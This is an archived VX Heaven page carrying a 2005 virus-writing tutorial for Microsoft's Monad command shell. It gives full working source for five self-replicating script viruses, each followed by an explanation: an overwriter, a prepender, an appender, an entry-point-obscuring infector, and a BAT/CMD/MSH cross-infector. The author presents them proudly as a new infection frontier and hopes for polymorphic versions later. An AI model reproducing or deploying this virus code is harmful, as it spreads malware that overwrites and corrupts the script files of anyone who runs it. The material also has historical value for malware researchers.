<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> SPTH 'Monad: Microsoft Command Shell Infection Tutorial' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="SPTH"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, SPTH,Monad: Microsoft Command Shell Infection Tutorial, candela, cont, file, array, writes, victim, cross, words, echo, length, microsoft, write, command, random, windows"/>
<meta name="Description" content="Monad - Microsoft Command Shell is the next version of CMD.exe and will be used in Microsoft Windows Longhorn. Everybody knows that command.com and CMD.exe had a very small amount of commands, and where therefore nearly useless. Monad will be like Linux's Bash - that means a great number of command and functions. We will be able to make as huge and complex script as we can do it in Linux. As I thought this next step of Microsoft (stealing the ideas of OpenSource Software) should be infected too, I did. It is totally different to the older Command Shell of M$: The objects seems to have a very near connection to C#, the syntax is near to the syntax of bash or PHP. Nevertheless I sat down and tried it, and after ~6 hours after installing I saw my first Overwriter working. I think it is quite funny to infect a future part of Longhorn, which will be released in ~12 months. :D Just for information: I've worked with Windows Command Shell [6.0.4093.0]. Now, let's more to the real content!"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"1cedc782a19959c1dc42cec0a5fa113138e1fc56-1498756791-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vsp07.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Monad: Microsoft Command Shell Infection Tutorial</h1><p><a href="/lib/?lang=en&amp;author=SPTH"> SPTH</a><br/> <em><a href="/vx.php?fid=1413#f1413">Ready Rangers Liberation Front [6]</a></em><br/> <em>July 2005</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vsp07.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=MA#vsp07">Back to index</a>] [<a href="/lib/vsp07.html#disqus_thread">Comments</a>]<br/> 
<h2>Index</h2>
<ol start="0">
<li>Intro Words</li>
<li>File Infection
<ol>
<li>Overwriting</li>
<li>Prepending</li>
<li>Appending</li>
<li>Entry Point Obscuring</li>
<li>Cross Infection: BAT / CMD / MSH</li>
</ol></li>
<li>Last Words</li>
</ol>
<h2>0) Intro Words</h2>
<p>Monad - Microsoft Command Shell is the next version of CMD.exe and will be used in Microsoft Windows Longhorn. Everybody knows that command.com and CMD.exe had a very small amount of commands, and where therefore nearly useless. Monad will be like Linux's Bash - that means a great number of command and functions. We will be able to make as huge and complex script as we can do it in Linux. As I thought this next step of Microsoft (stealing the ideas of OpenSource Software) should be infected too, I did. It is totally different to the older Command Shell of M$: The objects seems to have a very near connection to C#, the syntax is near to the syntax of bash or PHP. Nevertheless I sat down and tried it, and after ~6 hours after installing I saw my first Overwriter working. I think it is quite funny to infect a future part of Longhorn, which will be released in ~12 months. :D Just for information: I've worked with Windows Command Shell [6.0.4093.0]. Now, let's more to the real content!</p>
<h2>1) File Infection</h2>
<h3>1.1) Overwriting</h3>
<p>Usually, this topic is not interesting at all, but I think you should see a the sample too, for getting a first idea about that language. The virus overwrites all *.msh files in the current directory:</p>
<p><strong>MSH Overwriter</strong></p>
<div class="msh" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">$name_array=get-childitem *.msh<br/>
foreach ($name in $name_array)<br/>
{<br/>
&nbsp; if ($name.Length -eq 249)<br/>
&nbsp; {<br/>
&nbsp; &nbsp; $my_file=$name.Name<br/>
&nbsp; }<br/>
}<br/>
<br/>
foreach ($victim in $name_array)<br/>
{<br/>
&nbsp; if ($name.Length -ne 249)<br/>
&nbsp; {<br/>
&nbsp; &nbsp; copy-item $my_file $name.Name<br/>
&nbsp; }<br/>
}<br/>
&nbsp;</div>
<p>The virus works like that:</p>
<ul>
<li>Getting all *.msh file entries in $name_array</li>
<li>Searchs itself via the filelength</li>
<li>Copy itself to every other *.msh file-name</li>
</ul>
<h3>1.2) Prepending</h3>
<p>This Prepender is now the first real MSH virus. For the following small code I've worked several hours, as there are strange logical problems between normal variables and arrays. But finally I did it, and now you can see the the result. The short description can be found after the code.</p>
<p><strong>MSH Prepender</strong></p>
<div class="msh" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">$name_array=get-childitem *.msh<br/>
# Candela<br/>
foreach ($name in $name_array)<br/>
{<br/>
&nbsp; $cont=get-content $name.Name<br/>
&nbsp; if ($cont[1] -eq &quot;# Candela&quot;)<br/>
&nbsp; {<br/>
&nbsp; &nbsp; $my_name=$name.Name<br/>
&nbsp; }<br/>
}<br/>
<br/>
$vir_cont=get-content $my_name<br/>
<br/>
foreach ($name in $name_array)<br/>
{<br/>
&nbsp; $cont=get-content $name.Name<br/>
&nbsp; if ($cont[1] -ne &quot;# Candela&quot;)<br/>
&nbsp; { <br/>
&nbsp; &nbsp; echo $vir_cont[0] &gt;$name.Name<br/>
&nbsp; &nbsp; for ($i=1; $i -lt 23; $i++) { echo $vir_cont[$i] &gt;&gt;$name.Name }<br/>
&nbsp; &nbsp; echo $cont &gt;&gt;$name.Name<br/>
&nbsp; }<br/>
}<br/>
&nbsp;</div>
<p>It works like that:</p>
<ul>
<li>Getting *.msh files in the current directory</li>
<li>Searching itself in the files (via Virusstring in the second line)</li>
<li>Reads the whole file's date</li>
<li>Searchs for not infected *.msh files</li>
<li>Writes the 23 viruslines into the file</li>
<li>Writes the victim's content to the file</li>
</ul>
<h3>1.3) Appending</h3>
<p>The next important file infection type if the appending file infector. The code is just slight different to the prepending file infection type, so there should be no problem to understand it, if you have already understood the other codes. For this code I did not need very long (~20 mins), so you can see, that this language is not very difficult, if you know, how to work with it. OK, here the code:</p>
<p><strong>MSH Appender</strong></p>
<div class="msh" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">$name_array=get-childitem *.msh<br/>
# Candela<br/>
foreach ($name in $name_array)<br/>
{<br/>
&nbsp; $cont=get-content $name.Name<br/>
&nbsp; for ($i=0; $i -lt $cont.Length; $i++)<br/>
&nbsp; {<br/>
&nbsp; &nbsp; if ($cont[$i] -eq &quot;# Candela&quot;)<br/>
&nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; $my_name=$name.Name<br/>
&nbsp; &nbsp; }<br/>
&nbsp; }<br/>
}<br/>
<br/>
$vir_cont=get-content $my_name<br/>
foreach ($name in $name_array)<br/>
{<br/>
&nbsp; $inf=0<br/>
&nbsp; $cont=get-content $name.Name<br/>
&nbsp; for ($i=0; $i -lt $cont.Length; $i++)<br/>
&nbsp; {<br/>
&nbsp; &nbsp; if ($cont[$i] -eq &quot;# Candela&quot;)<br/>
&nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; $inf=1<br/>
&nbsp; &nbsp; }<br/>
&nbsp; }<br/>
&nbsp; if ($inf -eq 0)<br/>
&nbsp; {<br/>
&nbsp; &nbsp; echo $cont &gt;$name.Name<br/>
&nbsp; &nbsp; $vir_start=$vir_cont.Length-36<br/>
&nbsp; &nbsp; for ($i=$vir_start; $i -lt $vir_cont.Length; $i++) <br/>
&nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; echo $vir_cont[$i] &gt;&gt;$name.Name<br/>
&nbsp; &nbsp; }<br/>
&nbsp; }<br/>
}<br/>
&nbsp;</div>
<p>How does it work:</p>
<ul>
<li>Searching for *.msh files in the current directory</li>
<li>Searching in every file for a line with the Virusname</li>
<li>Get the name of the current infected file</li>
<li>Get the content of that file</li>
<li>Searchs in every file for a line with the Virusname to get not-infected files</li>
<li>Write the original content to the file</li>
<li>Write the 36 lines (which are at the end of the file) to the file</li>
</ul>
<h3>1.4) Entry Point Obscuring</h3>
<p>The last three infection types are very easy to detect and to desinfect. Now comes the first techniqual trick: EPO. The virus infects the file anywhere in the middle. This makes it harder to find, as the whole files have to be checked, not just the beginning and the end of the file. A very hard problem for this beta is, that there is no command for random numbers. There is a command called get-random, but it is just a demo and does not exist in the MSH.exe, but in a DemoCommands.dll. I did not want to use this DemoCommands.dll, as the virus will not work at next betas or at the final version. See the information from cmdletSummary.htm:</p>
<pre>
get-random (Demo)       Returns a random integer within        get-random [[-max] maximum] 
                        the integer range specified.           [[-min] minimum]
</pre>
<p>I solved that problem in another way: I added the length of all files in files in the current directory, and used the arithmetic operator % for getting a valueable pseudo random number. Everything else should be clear. A shourt summary of the virus after the code.</p>
<p><strong>MSH EPO</strong></p>
<div class="msh" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">$name_array=get-childitem *.msh<br/>
# Candela<br/>
foreach ($name in $name_array)<br/>
{<br/>
&nbsp; $cont=get-content $name.Name<br/>
&nbsp; for ($i=0; $i -lt $cont.Length; $i++)<br/>
&nbsp; {<br/>
&nbsp; &nbsp; if ($cont[$i] -eq &quot;# Candela&quot;)<br/>
&nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; $my_name=$name.Name<br/>
&nbsp; &nbsp; &nbsp; $my_position=$i-1<br/>
&nbsp; &nbsp; }<br/>
&nbsp; }<br/>
}<br/>
<br/>
$all=get-childitem *.*<br/>
$rnd_num=0<br/>
for ($i=0; $i -lt $all.Length; $i++)<br/>
{<br/>
&nbsp; $rnd_num+=$all[$i].Length<br/>
}<br/>
<br/>
$vir_cont=get-content $my_name<br/>
foreach ($name in $name_array)<br/>
{<br/>
&nbsp; $inf=0<br/>
&nbsp; $cont=get-content $name.Name<br/>
&nbsp; for ($i=0; $i -lt $cont.Length; $i++)<br/>
&nbsp; {<br/>
&nbsp; &nbsp; if ($cont[$i] -eq &quot;# Candela&quot;)<br/>
&nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; $inf=1<br/>
&nbsp; &nbsp; }<br/>
&nbsp; }<br/>
&nbsp; if ($inf -eq 0)<br/>
&nbsp; {<br/>
&nbsp; &nbsp; $position=$rnd_num%$cont.Length<br/>
&nbsp; &nbsp; echo $cont[0] &gt;$name.Name<br/>
&nbsp; &nbsp; for ($i=1; $i -lt $position; $i++) <br/>
&nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; echo $cont[$i] &gt;&gt;$name.Name<br/>
&nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; for ($i=$my_position; $i -lt $my_position+54; $i++) <br/>
&nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; echo $vir_cont[$i] &gt;&gt;$name.Name<br/>
&nbsp; &nbsp; }<br/>
<br/>
&nbsp; &nbsp; for ($i=$position; $i -lt $cont.Length; $i++) <br/>
&nbsp; &nbsp; {<br/>
&nbsp; &nbsp; &nbsp; echo $cont[$i] &gt;&gt;$name.Name<br/>
&nbsp; &nbsp; }<br/>
&nbsp; }<br/>
}<br/>
&nbsp;</div>
<p>Summary of the code above:</p>
<ul>
<li>Searchs for *.msh files in the current directory</li>
<li>Searchs in every file for the Virusstring</li>
<li>Saves the name of the file and the position of the virus</li>
<li>Searchs for *.* files in the current directory</li>
<li>Adds the filelength of every file</li>
<li>Searchs for a virusstring in every *.msh to get uninfected files</li>
<li>Calculates a valueable random number with <code>$rnd_num%$cont.Length</code></li>
<li>Writes the first part of the victim to the victim</li>
<li>Writes the virus to the victim</li>
<li>Writes the last part of the victim to the victim</li>
</ul>
<h3>1.5) Cross Infection: BAT / CMD / MSH</h3>
<p>Last code is a cross infector for every Windows Command Line. That means BAT-Files (Win95-98), CMD-Files (WinNT/Win00-WinXP) and MSH-Files (Windows Longhorn [and maybe Blackcomp???]). I've done it without intern code changing while runtime, but all in one code. That means the code for BAT files looks like that one from CMDs and that one from MSH. As you will see now, there were very big problems, as MSH has no more-line command (like /* */), it fails when an error occure (No On Error Resume Next), it checks the content of functions, even they are not executed ect. Anyway, somehow I did it, and you can see it now - but without summary at the end, as there is nothing more to explain, you just see the (already known) code and the Cross-Infection technique.</p>
<p><strong>BAT/CMD/MSH Cross Infector</strong></p>
<div class="msh" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">#Candela<br/>
$Candela=('<br/>
@echo off %Candela%<br/>
rem ','Candela<br/>
%Candela%cls<br/>
rem ','Candela<br/>
find &quot;Candela&quot; &lt;%0 &gt; Candela.bat %Candela% <br/>
rem ','Candela<br/>
for %%v in (*.bat *.msh *.cmd) do copy Candela.bat+%%v %%v<br/>
rem ','Candela<br/>
del Candela.bat<br/>
rem ','Candela<br/>
goto Candela<br/>
rem ','Candela<br/>
set Candela=1')<br/>
$name_array=get-childitem *.msh &nbsp; &nbsp;#Candela<br/>
$name_array+=get-childitem *.bat &nbsp; #Candela<br/>
$name_array+=get-childitem *.cmd &nbsp; #Candela<br/>
foreach ($name in $name_array) { &nbsp; #Candela<br/>
&nbsp; $cont=get-content $name.Name &nbsp; &nbsp; #Candela<br/>
&nbsp; if ($cont[0] -eq &quot;#Candela&quot;){<br/>
&nbsp; &nbsp; $my_name=$name.Name &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;#Candela<br/>
&nbsp; } #Candela<br/>
} #Candela<br/>
$vir_cont=get-content $my_name &nbsp; &nbsp; #Candela<br/>
foreach ($name in $name_array) { &nbsp; #Candela<br/>
&nbsp; $cont=get-content $name.Name &nbsp; &nbsp; #Candela<br/>
&nbsp; if ($cont[0] -ne &quot;#Candela&quot;) {<br/>
&nbsp; &nbsp; echo $vir_cont[0] &gt;$name.Name &nbsp;#Candela<br/>
&nbsp; &nbsp; for ($i=1; $i -lt 34; $i++) { echo $vir_cont[$i] &gt;&gt;$name.Name } #Candela<br/>
&nbsp; &nbsp; echo $cont &gt;&gt;$name.Name &nbsp; &nbsp; &nbsp; &nbsp;#Candela<br/>
&nbsp; } #Candela<br/>
} #Candela<br/>
:Candela<br/>
&nbsp;</div>
<h2>2) Last Words</h2>
<p>I'm too happy that I've finally managed to write this article. Reason: Microsoft Windows Longhorn (or Windows 2006 - as it will be called too) will be released in ~12 months. One sad thing: As there is currently no random-number generator included, it was not possible to write polymorphic engines for it, but someday they will include it, and then it's again time to rock ;) With this article I also wanted to show/tell you, that we are at the beginning of a real good new age. I hope some of you are ready for new discoverment too! :D</p>
<pre>
                                                  - - - - - - - - - - - - - - -
                                                    Second Part To Hell/[rRlf]  
                                                    www.spth.de.vu
                                                    <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a2d1d2d6cae2d2d0cbc7d1d68cc1cdcf">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>
                                                    written in July 2005

                                                    ...surrealistic viruswriter...
                                                  - - - - - - - - - - - - - - -</pre>[<a style="" href="/lib/?lang=EN&amp;index=MA#vsp07">Back to index</a>] [<a href="/lib/vsp07.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vsp07">de</a><a href="/lib/index.php?lang=en&amp;id=vsp07">en</a><a href="/lib/index.php?lang=es&amp;id=vsp07">es</a><a href="/lib/index.php?lang=it&amp;id=vsp07">it</a><a href="/lib/index.php?lang=fr&amp;id=vsp07">fr</a><a href="/lib/index.php?lang=pl&amp;id=vsp07">pl</a><a href="/lib/index.php?lang=ru&amp;id=vsp07">ru</a><a href="/lib/index.php?lang=ua&amp;id=vsp07">ua</a></div>
</body>
</html>
